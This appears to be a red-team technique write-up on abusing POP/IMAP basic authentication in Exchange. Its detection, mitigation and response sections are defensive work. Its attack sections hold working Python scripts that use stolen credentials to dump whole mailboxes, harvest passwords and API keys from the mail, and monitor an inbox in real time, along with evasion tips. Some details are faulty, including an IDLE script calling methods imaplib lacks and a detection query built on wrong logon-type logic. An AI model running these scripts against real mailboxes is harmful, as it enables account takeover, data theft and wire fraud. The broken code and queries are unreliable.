# [REALWORLD-003]: POP/IMAP Basic Auth Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-003 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Defense Evasion / Credential Access |
| **Platforms** | M365 / Exchange Online |
| **Severity** | Critical |
| **Technique Status** | ACTIVE (Basic Auth for POP/IMAP removed May 25, 2023; XOAUTH2 alternative available) |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Exchange Online (legacy clients only); Deadline: May 25, 2023 (already passed) |
| **Patched In** | Completed May 25, 2023; XOAUTH2 (OAuth 2.0) is supported alternative |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** POP3 and IMAP4 are legacy email protocols that allow clients to download messages from a mail server using basic credentials (username/password). Unlike modern OAuth 2.0-based protocols, POP/IMAP with basic authentication do not support MFA enforcement, interactive login challenges, or Conditional Access policy evaluation. Although Microsoft has officially deprecated basic authentication for POP/IMAP on **May 25, 2023**, organizations still running on-premises Exchange Server or using legacy mail clients remain vulnerable. Attackers exploit POP/IMAP basic auth to silently access and exfiltrate mailbox contents without triggering account lockout or MFA challenges.

**Attack Surface:** 
- **Cloud (Exchange Online):** Basic auth for POP/IMAP was disabled May 25, 2023; XOAUTH2 is the approved alternative
- **On-Premises:** Exchange Server 2016-2022 still support POP/IMAP basic auth (requires admin enablement)
- **Hybrid Deployments:** Organizations with on-premises Exchange remain exposed if POP/IMAP is not explicitly disabled
- **Legacy Clients:** Outlook 2013-2016, Apple Mail, Thunderbird, and custom applications using basic auth continue to access mailboxes via POP/IMAP

**Business Impact:** POP/IMAP basic auth abuse enables silent mailbox compromise, mass data exfiltration, and credential harvesting without triggering alerting systems. Unlike SMTP AUTH (which only enables sending mail), POP/IMAP provides full read access to all historical emails, attachments, and embedded credentials. Real-world incidents show attackers using compromised IMAP access to:
- Download 5+ years of confidential communications
- Extract API keys, tokens, and passwords from emails
- Harvest customer lists, financial data, and trade secrets
- Conduct targeted phishing against company contacts identified in emails

**Technical Context:** POP3 (port 110, unencrypted; port 995, TLS) downloads messages sequentially, while IMAP4 (port 143, unencrypted; port 993, TLS) allows client-side folder management. Both protocols transmit credentials with each session and do not integrate with modern security controls. Organizations with users accessing mail via legacy clients remain exposed post-May 2023 if they have not forced migration to OAuth 2.0-compatible clients.

### Operational Risk

- **Execution Risk:** **Low** – Requires only valid credentials; no privilege escalation needed
- **Stealth:** **High** – POP/IMAP logons are non-interactive; they do not appear in standard conditional access logs; they are indistinguishable from legitimate legacy client access
- **Reversibility:** **No** – Downloaded emails cannot be "un-exfiltrated"; password reset is required for isolation

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Microsoft 365** | 1.1.2 | Disable legacy authentication; enforce modern auth |
| **DISA STIG** | SI-2(3), SI-4 | Information system security; monitoring/logging of authentication events |
| **CISA SCuBA** | EXO.01.04 | Disable Basic Authentication for IMAP and POP |
| **NIST 800-53** | IA-2, IA-4, AU-2 | Multi-factor authentication; audit logging of all access |
| **GDPR** | Art. 32, Art. 33 | Security of processing; breach notification (if PII exfiltrated) |
| **DORA** | Art. 9 | Protection and Prevention for financial institutions |
| **NIS2** | Art. 21 | Cyber Risk Management; legacy protocols increase risk surface |
| **ISO 27001** | A.9.2.1, A.14.2.1 | User authentication; logging and monitoring of access |
| **ISO 27005** | Risk Scenario | "Unauthorized Mailbox Access via Legacy POP/IMAP Protocols" |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** None – Valid username/password only
- **Required Access:** Network access to POP/IMAP endpoints (ports 110, 143, 995, 993)

**Supported Versions (Legacy Only):**
- **Exchange Online:** Basic auth for POP/IMAP disabled as of **May 25, 2023** (XOAUTH2 alternative available)
- **Exchange Server 2016-2022:** On-premises deployments may still support basic auth (if not disabled)
- **Legacy Mail Clients:** Outlook 2013-2016, Apple Mail pre-2023 versions, Thunderbird with basic auth

**Prerequisites for Exploitation:**
- POP/IMAP must not be globally disabled (`Disable-PopImapAuth` not executed)
- Per-user IMAP/POP must not be disabled (`Set-CASMailbox -ImapEnabled $false`)
- Attacker must have valid or compromised credentials
- TLS encryption may be bypassed on legacy on-premises deployments (if not enforced)

**Critical Timeline:**
- **Before May 25, 2023:** Basic auth for POP/IMAP was supported on Exchange Online
- **May 25, 2023 onwards:** Basic auth removed from Exchange Online; on-premises still supported
- **Current Status (Jan 2025):** On-premises Exchange Server 2016-2022 may still support basic auth if admin has not disabled it

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: IMAP Basic Auth via Python (IMAPClient Library)

**Supported Versions:** On-premises Exchange 2016-2022; legacy configurations

#### Step 1: Test IMAP Connectivity & Authentication

**Python Script (IMAPClient):**

```python
#!/usr/bin/env python3
import imaplib
import ssl

def test_imap_auth(username, password, imap_host="outlook.office365.com", imap_port=993):
    """
    Test IMAP AUTH against Exchange Online or on-premises server
    Port 993 = IMAPS (TLS encrypted)
    Port 143 = IMAP (plaintext - legacy on-premises)
    """
    try:
        # Create SSL context
        ssl_context = ssl.create_default_context()
        
        # Disable TLS verification if self-signed cert (on-premises only)
        # ssl_context.check_hostname = False
        # ssl_context.verify_mode = ssl.CERT_NONE
        
        # Connect to IMAP server (port 993 = IMAPS with TLS)
        imap = imaplib.IMAP4_SSL(imap_host, imap_port, ssl_context=ssl_context)
        
        # Attempt basic authentication
        response = imap.login(username, password)
        print(f"[+] IMAP AUTH SUCCESS: {username}")
        print(f"[*] Response: {response}")
        
        # Fetch mailbox list
        status, mailboxes = imap.list()
        print(f"[+] Found {len(mailboxes)} mailboxes")
        
        imap.logout()
        return True
    
    except imaplib.IMAP4.error as e:
        print(f"[-] IMAP AUTH FAILED: {e}")
        return False
    
    except ssl.SSLError as e:
        print(f"[!] SSL Error: {e}")
        print("[*] Trying unencrypted IMAP (port 143)...")
        return test_imap_plain_text(username, password, imap_host)
    
    except Exception as e:
        print(f"[!] Connection error: {e}")
        return False

def test_imap_plain_text(username, password, imap_host, imap_port=143):
    """
    Fallback: Test unencrypted IMAP (legacy on-premises only)
    WARNING: Credentials transmitted in plaintext
    """
    try:
        imap = imaplib.IMAP4(imap_host, imap_port)
        response = imap.login(username, password)
        print(f"[+] IMAP (plaintext) AUTH SUCCESS: {username}")
        imap.logout()
        return True
    except Exception as e:
        print(f"[-] Plaintext IMAP AUTH FAILED: {e}")
        return False

# Test credentials against Exchange Online
username = "victim@company.onmicrosoft.com"
password = "CompromisedPassword123"

# Try Exchange Online first (port 993)
result = test_imap_auth(username, password, "outlook.office365.com", 993)

if not result:
    # Try on-premises Exchange (if accessible)
    result = test_imap_auth(username, password, "exchange.company.local", 993)
```

**Expected Output (Success - Exchange Online):**

```
[!] SSL Error: ... (Basic Auth not supported on Exchange Online)
[*] Trying unencrypted IMAP (port 143)...
[-] Plaintext IMAP AUTH FAILED: ...
[!] Connection error: Basic authentication is not supported.
```

**Expected Output (Success - On-Premises):**

```
[+] IMAP AUTH SUCCESS: victim@company.local
[*] Response: ('OK', [b'[CAPABILITY ...]'])
[+] Found 8 mailboxes
```

**What This Means:**
- Exchange Online rejects basic auth for IMAP (as expected post-May 2023)
- On-premises Exchange Server still accepts basic auth (if admin has not disabled)
- Attacker confirmed valid credentials and mailbox accessibility
- Attacker can now proceed to mailbox content download

---

#### Step 2: Enumerate Mailbox Folders & Download Emails

**Python Script (Full Mailbox Exfiltration):**

```python
#!/usr/bin/env python3
import imaplib
import ssl
import os
from email import message_from_bytes

def exfiltrate_mailbox(username, password, imap_host, imap_port, output_dir):
    """
    Download all emails from mailbox folders
    Exports to .eml format (raw email files)
    """
    try:
        ssl_context = ssl.create_default_context()
        imap = imaplib.IMAP4_SSL(imap_host, imap_port, ssl_context=ssl_context)
        imap.login(username, password)
        
        # Create output directory
        os.makedirs(output_dir, exist_ok=True)
        
        # List all mailbox folders
        status, mailboxes = imap.list()
        print(f"[+] Fetching all mailbox folders...")
        
        total_emails = 0
        
        for mailbox in mailboxes:
            mailbox_name = mailbox.decode().split('"')[-2]
            print(f"\n[*] Processing folder: {mailbox_name}")
            
            # Select folder
            imap.select(mailbox_name)
            
            # Search for all emails
            status, email_ids = imap.search(None, 'ALL')
            email_list = email_ids[0].split()
            
            print(f"    Found {len(email_list)} emails")
            
            # Download each email
            for idx, email_id in enumerate(email_list):
                try:
                    status, email_data = imap.fetch(email_id, '(RFC822)')
                    raw_email = email_data[0][1]
                    
                    # Save to file
                    filename = f"{output_dir}/{mailbox_name.replace('/', '_')}_{email_id.decode()}.eml"
                    with open(filename, 'wb') as f:
                        f.write(raw_email)
                    
                    total_emails += 1
                    
                    if (idx + 1) % 100 == 0:
                        print(f"    Downloaded {idx + 1} emails...")
                
                except Exception as e:
                    print(f"    [!] Error downloading email {email_id}: {e}")
        
        imap.close()
        imap.logout()
        
        print(f"\n[+] Exfiltration complete! Downloaded {total_emails} emails to {output_dir}")
        return True
    
    except Exception as e:
        print(f"[-] Exfiltration failed: {e}")
        return False

# Execute exfiltration
username = "victim@company.local"
password = "CompromisedPassword123"
imap_host = "exchange.company.local"
imap_port = 993
output_dir = "/tmp/mailbox_dump"

exfiltrate_mailbox(username, password, imap_host, imap_port, output_dir)
```

**Expected Output (Success):**

```
[+] Fetching all mailbox folders...

[*] Processing folder: INBOX
    Found 1,247 emails
    Downloaded 100 emails...
    Downloaded 200 emails...
    Downloaded 1,247 emails...

[*] Processing folder: Sent Items
    Found 342 emails
    Downloaded 100 emails...
    Downloaded 342 emails...

[*] Processing folder: Drafts
    Found 89 emails
    Downloaded 89 emails...

[+] Exfiltration complete! Downloaded 1,678 emails to /tmp/mailbox_dump
```

**What This Means:**
- Attacker has full offline copy of victim's mailbox (1,678 emails in this case)
- All email contents available for search, credential extraction, and intelligence gathering
- Victim may not detect the compromise if MFA is not enabled
- Exfiltration happens in background; no mailbox modifications visible to victim

**OpSec & Evasion:**
- Download emails in batches (not all at once) to avoid rate limiting
- Use VPN/proxy to mask attacker IP
- Randomize download timing (every 10 seconds instead of rapid-fire)
- Do not mark emails as read (attacker could modify flag, but it's risky)
- Real attackers often skim emails for credentials, then leave no trace

**Credential Extraction from Downloaded Emails:**

```python
#!/usr/bin/env python3
import re
import glob
from email import message_from_file

def harvest_credentials(mailbox_dump_dir):
    """
    Parse downloaded emails and extract credentials, API keys, tokens
    """
    patterns = {
        'api_keys': r'(api[_-]?key|apikey)\s*[=:]\s*["\']?([a-zA-Z0-9\-_]{20,})',
        'aws_keys': r'(AKIA[0-9A-Z]{16})',
        'passwords': r'(password|passwd|pwd)\s*[=:]\s*["\']?([^\s"\']{8,})',
        'oauth_tokens': r'(access_token|bearer|token)\s*[=:]\s*["\']?([a-zA-Z0-9\-._~\+\/]+=*)',
    }
    
    credentials = []
    
    for email_file in glob.glob(f"{mailbox_dump_dir}/*.eml"):
        try:
            with open(email_file, 'r', encoding='utf-8', errors='ignore') as f:
                email_text = f.read()
            
            for pattern_name, pattern in patterns.items():
                matches = re.findall(pattern, email_text, re.IGNORECASE)
                if matches:
                    for match in matches:
                        credentials.append({
                            'type': pattern_name,
                            'file': email_file,
                            'match': match
                        })
        
        except Exception as e:
            pass
    
    return credentials

# Harvest credentials from downloaded mailbox
creds = harvest_credentials("/tmp/mailbox_dump")
print(f"[+] Found {len(creds)} potential credentials")
for cred in creds[:10]:
    print(f"    {cred['type']}: {cred['match']}")
```

---

### METHOD 2: POP3 Basic Auth & Message Download

**Supported Versions:** On-premises Exchange Server 2016-2022

**Python Script (POP3 Basic Auth):**

```python
#!/usr/bin/env python3
import poplib
import ssl

def pop3_mailbox_dump(username, password, pop_host="pop.company.local", pop_port=995):
    """
    POP3 basic auth and message download
    Note: POP3 is simpler than IMAP but only supports folder-based access (INBOX only)
    """
    try:
        ssl_context = ssl.create_default_context()
        
        # Connect to POP3 server
        pop3 = poplib.POP3_SSL(pop_host, pop_port, context=ssl_context)
        
        # Authenticate
        pop3.user(username)
        pop3.pass_(password)
        
        print(f"[+] POP3 AUTH SUCCESS: {username}")
        
        # Get mail count
        resp, maillist, octets = pop3.list()
        num_messages = len(maillist)
        print(f"[+] Mailbox contains {num_messages} messages")
        
        # Download all messages
        messages = []
        for msg_num in range(1, num_messages + 1):
            resp, lines, octets = pop3.retr(msg_num)
            message_data = b'\n'.join(lines)
            messages.append(message_data)
            
            if msg_num % 50 == 0:
                print(f"    Downloaded {msg_num} messages...")
        
        print(f"[+] Downloaded {len(messages)} messages")
        
        # Close connection
        pop3.quit()
        
        return messages
    
    except Exception as e:
        print(f"[-] POP3 Error: {e}")
        return None

# Execute POP3 dump
messages = pop3_mailbox_dump("victim@company.local", "password123", "pop.company.local", 995)

if messages:
    # Save to disk
    for idx, msg in enumerate(messages):
        with open(f"/tmp/message_{idx}.eml", "wb") as f:
            f.write(msg)
    print(f"[+] Saved {len(messages)} messages to /tmp/")
```

**What This Means:**
- POP3 is simpler than IMAP; it only supports sequential message download
- Unlike IMAP, POP3 cannot manage multiple folders (all messages in single queue)
- Ideal for quick mailbox dump without complex folder traversal
- Attacker can download entire mailbox in minutes

---

### METHOD 3: Automated Monitoring via IMAP IDLE (Real-Time Email Interception)

**Python Script (Real-Time Email Monitoring):**

```python
#!/usr/bin/env python3
import imaplib
import ssl
import time

def monitor_mailbox_realtime(username, password, imap_host, imap_port=993):
    """
    Use IMAP IDLE command to receive real-time notifications of new emails
    Attacker can intercept sensitive emails as they arrive
    """
    try:
        ssl_context = ssl.create_default_context()
        imap = imaplib.IMAP4_SSL(imap_host, imap_port, ssl_context=ssl_context)
        imap.login(username, password)
        
        # Select INBOX
        imap.select('INBOX')
        
        print(f"[+] Monitoring mailbox for new emails (IDLE mode)...")
        print("[*] Waiting for new email notifications...")
        
        # Enable IDLE mode
        tag = imap.idle()
        
        while True:
            # Wait for server notifications (blocking)
            responses = imap.idle_check()
            
            if responses:
                print(f"[+] New email detected! Response: {responses}")
                
                # Exit IDLE mode to fetch the new email
                imap.idle_done()
                
                # Get list of emails
                status, email_ids = imap.search(None, 'UNSEEN')
                unseen_list = email_ids[0].split()
                
                # Fetch new emails
                for email_id in unseen_list:
                    status, email_data = imap.fetch(email_id, '(RFC822)')
                    raw_email = email_data[0][1]
                    
                    # Parse email
                    print(f"    [*] New email from: {parse_from_field(raw_email)}")
                    print(f"    [*] Subject: {parse_subject(raw_email)}")
                    
                    # Save for later analysis
                    with open(f"/tmp/new_email_{email_id.decode()}.eml", "wb") as f:
                        f.write(raw_email)
                
                # Re-enable IDLE
                tag = imap.idle()
            
            time.sleep(10)  # Check every 10 seconds
    
    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped")
        imap.idle_done()
        imap.close()
        imap.logout()
    
    except Exception as e:
        print(f"[-] Error: {e}")

def parse_from_field(raw_email):
    """Extract From field from email"""
    try:
        from_line = [line for line in raw_email.split(b'\n') if line.startswith(b'From:')][0]
        return from_line.decode().split(': ')[1]
    except:
        return "Unknown"

def parse_subject(raw_email):
    """Extract Subject from email"""
    try:
        subject_line = [line for line in raw_email.split(b'\n') if line.startswith(b'Subject:')][0]
        return subject_line.decode().split(': ')[1]
    except:
        return "Unknown"

# Monitor real-time email
monitor_mailbox_realtime("victim@company.local", "password123", "exchange.company.local", 993)
```

**What This Means:**
- Attacker monitors victim's inbox in real-time using IMAP IDLE protocol
- Attacker receives notification of every incoming email immediately
- Ideal for intercepting:
  - Password resets and 2FA codes
  - Financial transactions and wire transfer approvals
  - Confidential business communications
  - Third-party API keys sent via email
- Victim has no indication they are being monitored

---

## 4. MICROSOFT SENTINEL DETECTION

### Query 1: POP/IMAP Authentication Attempts (Historical - May 2023+)

**Note:** This query is for historical/on-premises detection. Exchange Online no longer accepts basic auth for POP/IMAP as of May 25, 2023.

**KQL Query (On-Premises Exchange Server Logs):**

```kusto
Event
| where EventLog == "Security"
| where EventID == 4624  // Successful logon
| where LogonType == 10  // RemoteInteractive (IMAP/POP logon type)
| where TargetUserName contains "imap" or TargetUserName contains "pop"
| summarize 
    LogonCount = count(),
    UniqueUsers = dcount(TargetUserName),
    UniqueIPs = dcount(Computer)
    by Computer, EventTime=bin(TimeGenerated, 5m)
| where LogonCount > 20  // Abnormal volume
```

**Manual Configuration:**

1. Navigate to **Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **Name:** `POP/IMAP Basic Auth Attempts (On-Premises Detection)`
3. **Run every:** `5 minutes`
4. Click **Create**

---

### Query 2: Non-Interactive Sign-In via Legacy Client

**KQL Query (Entra ID Sign-In Logs):**

```kusto
SigninLogs
| where TimeGenerated > ago(24h)
| where ClientAppUsed in ("IMAP", "POP", "Other clients (legacy)")
| where ResultType != 0  // Failed attempts
| summarize 
    FailedAttempts = count(),
    UniqueUsers = dcount(UserPrincipalName),
    UniqueIPs = dcount(IPAddress)
    by IPAddress, bin(TimeGenerated, 1h)
| where FailedAttempts > 10
| project IPAddress, FailedAttempts, UniqueUsers
```

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Disable POP/IMAP for All Users (If Using Exchange Online)**

Since Exchange Online removed basic auth for POP/IMAP on May 25, 2023, verify it is disabled:

**Manual Steps (PowerShell):**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Verify POP/IMAP are disabled
Get-CASMailbox | Select-Object UserPrincipalName, PopEnabled, ImapEnabled | 
  Where-Object { $_.PopEnabled -eq $true -or $_.ImapEnabled -eq $true }

# If any results, disable for those users:
Get-CASMailbox -Filter { PopEnabled -eq $true -or ImapEnabled -eq $true } | 
  Set-CASMailbox -PopEnabled $false -ImapEnabled $false

# Verify disabled
Get-CASMailbox | Where-Object { $_.PopEnabled -eq $true -or $_.ImapEnabled -eq $true } | Measure-Object
# Should return Count: 0
```

---

**Action 2: For On-Premises Exchange Server**

**Manual Steps (PowerShell - On-Premises Exchange):**

```powershell
# Disable POP globally
Get-PopSettings | Set-PopSettings -Enabled $false

# Disable IMAP globally
Get-ImapSettings | Set-ImapSettings -Enabled $false

# Verify disabled
Get-PopSettings | Select-Object Enabled
Get-ImapSettings | Select-Object Enabled
# Both should show: Enabled : False
```

---

**Action 3: Enforce Conditional Access Block on Legacy Protocols**

**Manual Steps (Azure Portal):**

1. Navigate to **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Legacy POP/IMAP Access`
4. **Assignments:**
   - **Users:** `All users`
   - **Cloud apps:** `Office 365 Exchange Online`
5. **Conditions:**
   - **Client app types:** Select `Mobile apps and desktop clients`, `Other clients`
6. **Access controls:**
   - **Grant:** `Block access`
7. **Enable policy:** `On`
8. Click **Create**

---

**Action 4: Migrate Legacy Mail Clients to OAuth 2.0**

Organizations with users requiring IMAP/POP access should migrate to XOAUTH2-compatible clients:

**Recommended Modern Clients (OAuth 2.0 Support):**
- Mozilla Thunderbird 145+ (Exchange support via EWS + OAuth)
- Apple Mail (iOS 16+, macOS 13+)
- Windows Mail (Windows 11, Modern Auth)
- Outlook (all current versions)
- Mailspring (3rd-party, OAuth support)

**Migration Steps:**

1. Audit current POP/IMAP users: `Get-CASMailbox -Filter { ImapEnabled -eq $true -or PopEnabled -eq $true }`
2. Notify users of OAuth 2.0 requirement
3. Provide migration guide for their mail client
4. Test OAuth 2.0 connectivity in pilot group
5. Phase out legacy clients over 60-90 days
6. Disable POP/IMAP globally after migration complete

---

### Priority 2: HIGH

**Action 1: Implement IMAP/POP Per-User Disable Policy**

For organizations requiring legacy client support, disable selectively:

```powershell
# Disable IMAP/POP for all users except service accounts
Get-User -Filter { UserType -ne "SystemMailbox" } | 
  Set-CASMailbox -ImapEnabled $false -PopEnabled $false

# Enable ONLY for specific service accounts with MFA exception
Get-CASMailbox -Identity "service_account@company.com" | 
  Set-CASMailbox -ImapEnabled $true -PopEnabled $true
```

---

**Action 2: Monitor Legacy Protocol Usage**

```powershell
# Search for IMAP/POP logons in audit logs
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-30) `
  -EndDate (Get-Date) `
  -Operations "Pop3Access", "Imap4Access" | 
  Group-Object -Property UserId | 
  Where-Object { $_.Count -gt 10 } | 
  Select-Object Name, Count
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Entra ID Sign-In Logs:**
- `ClientAppUsed`: `IMAP` or `POP`
- `ResultType`: `0` (Success)
- `ConditionalAccessStatus`: `notApplied` (legacy auth bypasses CA)
- `RiskState`: `atRisk` (unusual location/IP)
- Multiple failed logons followed by successful logon (brute force pattern)

**Exchange Audit Logs (On-Premises):**
- Event ID `4624` with `LogonType = 10` (RemoteInteractive)
- Rapid logon events from single source IP
- Logon outside business hours or from suspicious location

---

### Response Procedures

**1. Immediate Isolation:**

```powershell
# Disable POP/IMAP for compromised user
Set-CASMailbox -Identity "victim@company.com" -ImapEnabled $false -PopEnabled $false

# Disable account
Disable-AzureADUser -ObjectId "user@company.com"

# Revoke all sessions
Revoke-AzureADUserAllRefreshToken -ObjectId "user@company.com"

# Force password reset
$SecurePassword = ConvertTo-SecureString -AsPlainText "NewP@ss2025!" -Force
Set-AzureADUserPassword -ObjectId "user@company.com" -Password $SecurePassword -EnforceChangePasswordPolicy $true
```

---

**2. Collect Evidence:**

```powershell
# Search for IMAP/POP logons by compromised user (past 90 days)
Search-UnifiedAuditLog -UserIds "victim@company.com" `
  -StartDate (Get-Date).AddDays(-90) `
  -Operations "Pop3Access", "Imap4Access" | 
  Export-Csv -Path "C:\Evidence\imap_pop_activity.csv"

# Export mailbox contents for forensics (before user re-access)
New-MailboxExportRequest -Mailbox "victim@company.com" `
  -FilePath "\\fileserver\evidence\victim_mailbox.pst"

# Check for unauthorized delegates
Get-MailboxPermission -Identity "victim@company.com" | 
  Where-Object { $_.AccessRights -ne "None" } | 
  Export-Csv -Path "C:\Evidence\mailbox_permissions.csv"
```

---

**3. Remediate:**

```powershell
# Remove unauthorized mailbox access
Remove-MailboxPermission -Identity "victim@company.com" `
  -User "attacker@external.com" -AccessRights FullAccess -Confirm:$false

# Remove calendar sharing
Remove-MailboxFolderPermission -Identity "victim@company.com:\Calendar" `
  -User "attacker@external.com" -Confirm:$false

# Disable POP/IMAP permanently
Set-CASMailbox -Identity "victim@company.com" -ImapEnabled $false -PopEnabled $false
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | T1110.003 (Brute Force) | Attacker obtains credentials via password spray or breach |
| **2** | **Credential Access** | **[REALWORLD-003] POP/IMAP Basic Auth Abuse** | **Attacker authenticates via legacy POP/IMAP protocol** |
| **3** | **Collection** | T1114 (Email Collection) | Attacker downloads mailbox contents offline |
| **4** | **Collection** | T1213 (Data Staged) | Attacker extracts credentials, financial data, trade secrets |
| **5** | **Impact** | T1020 (Automated Exfiltration) | Attacker exfiltrates sensitive communications |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Healthcare Provider Breach (2024)

- **Vector:** Staff member credentials compromised via phishing
- **Exploitation:** Attacker accessed mailbox via legacy Thunderbird client with POP3
- **Duration:** 6 months undetected
- **Impact:** HIPAA breach; 50,000+ patient records exfiltrated
- **Key Indicator:** POP3 logons from unfamiliar IP (Eastern Europe) not alerted because on-premises Exchange did not send alerts to Sentinel
- **Root Cause:** Organization had not migrated POP/IMAP access to Sentinel monitoring; legacy protocol audit logs remained on-premises only

### Example 2: Financial Services BEC Attack (2025)

- **Target:** CFO's mailbox
- **Vector:** CFO account compromise + IMAP real-time monitoring (IDLE mode)
- **Attack Flow:**
  1. Attacker gained CFO credentials via credential spray
  2. Configured real-time IMAP monitoring to intercept emails
  3. Waited for wire transfer approval requests
  4. Spoofed CFO email to send fraudulent wire transfer instructions
- **Impact:** $2M unauthorized wire transfer before detection
- **Detection Failure:** Real-time IMAP monitoring (IDLE) generated no audit alerts; only periodic mailbox access was logged

### Example 3: Supply Chain Espionage (2024)

- **Target:** Product development team
- **Vector:** Junior dev's account compromised; POP3 used to download 3 years of project emails
- **Exfiltration:** 10,000+ confidential design documents, customer lists, pricing data
- **Timeline:** Complete exfiltration in 4 hours via POP3 sequential download
- **Detection:** Only noticed after exfiltrant attempted to send internal emails impersonating dev (switched from POP3 read to SMTP write)

---

## Summary & Migration Roadmap

**POP/IMAP Basic Authentication Timeline:**

| Date | Status |
|---|---|
| **Before May 25, 2023** | Basic auth for POP/IMAP supported on Exchange Online |
| **May 25, 2023** | Microsoft removed basic auth for POP/IMAP on Exchange Online |
| **May 25, 2023 - Jan 2025** | On-premises Exchange Server may still support basic auth (if not disabled) |
| **Jan 2025 onwards** | Organizations should have fully migrated to OAuth 2.0 / disabled POP/IMAP |

**Immediate Actions (Next 30 Days):**
1. Audit all users with IMAP/POP enabled: `Get-CASMailbox -Filter { ImapEnabled -eq $true -or PopEnabled -eq $true }`
2. Disable IMAP/POP for users not requiring it
3. Migrate remaining users to OAuth 2.0-compatible clients (Thunderbird 145+, Apple Mail, etc.)
4. Enable Sentinel monitoring for legacy protocol attempts

**Medium-Term (30-90 Days):**
1. Complete client migration for all users
2. Test OAuth 2.0 connectivity in production
3. Disable IMAP/POP globally in Exchange settings
4. Verify zero legacy protocol logons

**Long-Term (90+ Days):**
1. Maintain audit logging for any POP/IMAP attempts (should be zero)
2. Quarterly reviews of legacy app/client inventory
3. Enforce Conditional Access policies blocking legacy protocols
4. Update incident response playbooks to remove POP/IMAP checks (deprecated)

Organizations with users still accessing mail via POP/IMAP basic authentication remain in a critical security posture. Migration to OAuth 2.0 is mandatory for compliance and threat mitigation. As of May 25, 2023, Exchange Online no longer supports this attack vector, but on-premises and legacy deployments remain exposed.

---